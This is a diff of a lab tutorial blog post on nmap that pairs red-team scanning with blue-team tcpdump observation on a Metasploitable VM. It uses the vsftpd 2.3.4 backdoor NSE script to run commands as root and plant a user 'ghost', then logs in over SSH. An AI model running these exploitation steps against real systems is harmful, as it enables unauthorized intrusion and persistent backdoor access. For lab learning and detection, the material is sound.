@@ -1,14 +1,14 @@
 ---
 layout: post
 title: 'Nmap & Getting to Know Thy Enemy'
-category: posts
+category: essays
 subcategory: 'vulnerability-management'
 permalink: 'nmap-getting-to-know-thy-enemy'
 ---
 
-![knowthyenemy]({{ site.url }}{{ site.baseurl }}/assets/theOffice.jpg)
+![knowthyenemy]({{ site.url }}{{ site.baseurl }}/_assets/theOffice.jpg)
 
-Hackers use `nmap` to enumerate details about their potential targets. It can identify open ports, running services, and which software versions are in use. Yet, it can also be used to determine the vulnerability of a system and even exploit it. In this blog post, I will demonstrate how to use `nmap` and how it can be observed. 
+Hackers use `nmap` to enumerate details about their potential targets. It can identify open ports, running services, and which software versions are in use. Yet, it can also be used to determine the vulnerability of a system and even exploit it. In this blog post, I will demonstrate how to use `nmap` and how it can be observed.
 
 ## Table of Contents
 * [Setup](#setup)
@@ -19,7 +19,7 @@ Hackers use `nmap` to enumerate details about their potential targets. It can id
 * [References](#references)
 
 ### Setup
-To follow along, I recommend hosting two Virtual Machines (VMs) on your computer. I personally used a [Metasploitable Linux](https://metasploit.help.rapid7.com/docs/metasploitable-2) VM and [Kali Linux](https://www.kali.org) VM via [VirtualBox](https://www.virtualbox.org). 
+To follow along, I recommend hosting two Virtual Machines (VMs) on your computer. I personally used a [Metasploitable Linux](https://metasploit.help.rapid7.com/docs/metasploitable-2) VM and [Kali Linux](https://www.kali.org) VM via [VirtualBox](https://www.virtualbox.org).
 * Metasploitable Linux VM: `192.168.56.4`
 * Kali Linux VM: `192.168.56.5`
 
@@ -51,7 +51,7 @@ Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds
 ```
 
 <font color='blue'>Blue Team</font>
-Since we are part of the target subnet and port scanning was turned-off, our *Host Discovery* probes will appear as a series of ARP requests. 
+Since we are part of the target subnet and port scanning was turned-off, our *Host Discovery* probes will appear as a series of ARP requests.
 ```bash
 tcpdump
 ```
@@ -71,12 +71,12 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
 
 ## OS Fingerprinting
 <font color='red'>Red Team</font>
-With a handful of targets already identified, we can mute Host Discovery and run a OS Fingerprint scan against a single node of interest. 
+With a handful of targets already identified, we can mute Host Discovery and run a OS Fingerprint scan against a single node of interest.
 > Disabling host discovery with -Pn causes Nmap to attempt the requested scanning functions against every target IP address specified.<br>
 <br>
 For machines on a local ethernet network, ARP scanning will still be performed (unless --disable-arp-ping or --send-ip is specified) because Nmap needs MAC addresses to further scan target hosts. In previous versions of Nmap, -Pn was -P0 and -PN. <br>
 <br>
-Nmap sends a series of TCP and UDP packets to the remote host and examines practically every bit in the responses. After performing dozens of tests such as TCP ISN sampling, TCP options support and ordering, IP ID sampling, and the initial window size check, Nmap compares the results to its nmap-os-db database of more than 2,600 known OS fingerprints and prints out the OS details if there is a match. 
+Nmap sends a series of TCP and UDP packets to the remote host and examines practically every bit in the responses. After performing dozens of tests such as TCP ISN sampling, TCP options support and ordering, IP ID sampling, and the initial window size check, Nmap compares the results to its nmap-os-db database of more than 2,600 known OS fingerprints and prints out the OS details if there is a match.
 
 ```bash
 nmap -Pn --disable-arp -O 192.168.56.4
@@ -138,15 +138,15 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
 1052 packets captured
 1052 packets received by filter
 0 packets dropped by kernel
-``` 
+```
 
 ## Service Detection
 <font color='red'>Red Team</font>
 > When doing vulnerability assessments (or even simple network inventories) of your companies or clients, you really want to know which...servers and versions are running. Having an accurate version number helps dramatically in determining which exploits a server is vulnerable to. Version detection helps you obtain this information.<br>
 <br>
-After TCP and/or UDP ports are discovered using one of the other scan methods, version detection interrogates those ports to determine more about what is actually running. The nmap-service-probes database contains probes for querying various services and match expressions to recognize and parse responses. 
+After TCP and/or UDP ports are discovered using one of the other scan methods, version detection interrogates those ports to determine more about what is actually running. The nmap-service-probes database contains probes for querying various services and match expressions to recognize and parse responses.
 
-As before, we can keep the amount of traffic on the network to a minimum by only specifying open TCP ports of interest during our Service Detection scan. 
+As before, we can keep the amount of traffic on the network to a minimum by only specifying open TCP ports of interest during our Service Detection scan.
 ```bash
 nmap -Pn --disable-arp -sV -p T:21,22,23,80,3306 192.168.56.4
 ```
@@ -167,7 +167,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
 ```
-Service Detection scans should also be performed against UDP ports. In the following example, I ran a scan using the Top 5 UDP ports found open as input. For this specific option, you can increase/decrease the number as desired. For instance, use `--top-ports 100` to probe the Top 100 TCP (`-sT` or `-sS`) or UDP (`-sU`) ports. 
+Service Detection scans should also be performed against UDP ports. In the following example, I ran a scan using the Top 5 UDP ports found open as input. For this specific option, you can increase/decrease the number as desired. For instance, use `--top-ports 100` to probe the Top 100 TCP (`-sT` or `-sS`) or UDP (`-sU`) ports.
 ```bash
 nmap -Pn --disable-arp --top-ports 5 -sUV 192.168.56.4
 ```
@@ -200,7 +200,7 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
 ```
 
 ## Vulnerability Assessment & Exploitation
-In 2015, the Nmap Scripting Engine (NSE) was introduced which then enabled Nmap to be used for Vulnerability Assessments & Exploitation. 
+In 2015, the Nmap Scripting Engine (NSE) was introduced which then enabled Nmap to be used for Vulnerability Assessments & Exploitation.
 > It allows users to write (and share) simple scripts to automate a wide variety of networking tasks.
 <br>
 NSE scripts define a list of categories they belong to. Currently defined categories are auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln.
@@ -221,11 +221,11 @@ To run available NSE scripts under the `vuln` category, execute the following co
 ```bash
 nmap --script vuln 192.168.56.4
 ```
-The expected output will identify what common exploits your target node is vulnerable to. The awesome part about the NSE is you can extend your analysis through homebrewed and publicly shared scripts. 
+The expected output will identify what common exploits your target node is vulnerable to. The awesome part about the NSE is you can extend your analysis through homebrewed and publicly shared scripts.
 ```python
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:40 EST
 Pre-scan script results:
-| broadcast-avahi-dos: 
+| broadcast-avahi-dos:
 |   Discovered hosts:
 |     224.0.0.251
 |   After NULL UDP avahi packet DoS (CVE-2011-1002).
@@ -235,7 +235,7 @@ Host is up (0.00060s latency).
 Not shown: 977 closed ports
 PORT     STATE SERVICE
 21/tcp   open  ftp
-| ftp-vsftpd-backdoor: 
+| ftp-vsftpd-backdoor:
 |   VULNERABLE:
 |   vsFTPd version 2.3.4 backdoor
 |     State: VULNERABLE (Exploitable)
@@ -250,7 +250,7 @@ PORT     STATE SERVICE
 |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
 |       http://osvdb.org/73573
 |_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
-|_sslv2-drown: 
+|_sslv2-drown:
 22/tcp   open  ssh
 23/tcp   open  telnet
 25/tcp   open  smtp
@@ -259,7 +259,7 @@ Nmap done: 1 IP address (1 host up) scanned in 348.71 seconds
 ```
 
 <font color='red'>Red Team</font>
-To learn more about an on-system NSE script, use the `--script-help` option. 
+To learn more about an on-system NSE script, use the `--script-help` option.
 ```bash
 nmap --script-help ftp-vsftpd-backdoor
 ```
@@ -282,7 +282,7 @@ https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html
   * http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2011-2523
 ```
 
-Here, we will only run the `ftp-vsftpd-backdoor` NSE script against our target's FTP port (`-p21`). The results will essentially be the same as our `--script vuln` scan yet, without information about other ports or services. 
+Here, we will only run the `ftp-vsftpd-backdoor` NSE script against our target's FTP port (`-p21`). The results will essentially be the same as our `--script vuln` scan yet, without information about other ports or services.
 ```bash
 nmap --script ftp-vsftpd-backdoor -p21 192.168.56.4
 ```
@@ -293,7 +293,7 @@ Host is up (0.00065s latency).
 
 PORT   STATE SERVICE
 21/tcp open  ftp
-| ftp-vsftpd-backdoor: 
+| ftp-vsftpd-backdoor:
 |   VULNERABLE:
 |   vsFTPd version 2.3.4 backdoor
 |     State: VULNERABLE (Exploitable)
@@ -313,11 +313,11 @@ MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 5.54 seconds
 ```
 
-Finally, NSE scripts can take multiple arguments from standard input. In our previous `ftp-vsftpd-backdoor` scan, the `id` shell command was executed as the `cmd` argument. Corresponding output suggests the exploit in question provides root-level access. We will explore this in a moment. First, let's try something a little more cliche. 
+Finally, NSE scripts can take multiple arguments from standard input. In our previous `ftp-vsftpd-backdoor` scan, the `id` shell command was executed as the `cmd` argument. Corresponding output suggests the exploit in question provides root-level access. We will explore this in a moment. First, let's try something a little more cliche.
 
 This command sentence has been spread across two lines for readability.  
 ```bash
-nmap --script ftp-vsftpd-backdoor \ 
+nmap --script ftp-vsftpd-backdoor \
 --script-args cmd="echo Hello World" -p21 192.168.56.4
 ```
 ```python
@@ -327,7 +327,7 @@ Host is up (0.00046s latency).
 
 PORT   STATE SERVICE
 21/tcp open  ftp
-| ftp-vsftpd-backdoor: 
+| ftp-vsftpd-backdoor:
 |   VULNERABLE:
 |   vsFTPd version 2.3.4 backdoor
 |     State: VULNERABLE (Exploitable)
@@ -366,7 +366,7 @@ Host is up (0.00053s latency).
 
 PORT   STATE SERVICE
 21/tcp open  ftp
-| ftp-vsftpd-backdoor: 
+| ftp-vsftpd-backdoor:
 |   VULNERABLE:
 |   vsFTPd version 2.3.4 backdoor
 |     State: VULNERABLE (Exploitable)
@@ -386,7 +386,7 @@ MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds
 ```
 
-Since there is typically no output for a successful `useradd` execution, we can assume it worked and try to login remotely. 
+Since there is typically no output for a successful `useradd` execution, we can assume it worked and try to login remotely.
 ```bash
 ssh ghost@192.168.56.4
 ```
@@ -406,7 +406,7 @@ applicable law.
 To access official Ubuntu documentation, please visit:
 http://help.ubuntu.com/
 Could not chdir to home directory /home/ghost: No such file or directory
-ghost@metasploitable:/$ 
+ghost@metasploitable:/$
 ```
 And we're in! Running the `id` shell command as before now tells us we have root-level access as `ghost`. Spooky!
 ```
